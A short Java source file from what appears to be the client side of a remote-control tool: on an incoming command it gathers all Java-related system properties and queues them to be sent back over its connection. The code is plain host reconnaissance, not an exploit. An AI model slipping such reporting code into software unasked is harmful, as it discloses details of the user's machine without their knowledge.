package com.redpois0n.packets.incoming;

import java.util.Set;

import com.redpois0n.Connection;
import com.redpois0n.packets.outgoing.Header;


public class PacketJVM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				Connection.addToSendQueue(new PacketBuilder(Header.JAVA_PROPERTIES, new String[] { obj.toString(), System.getProperty(obj.toString()) }));
			}
		}
	}

}
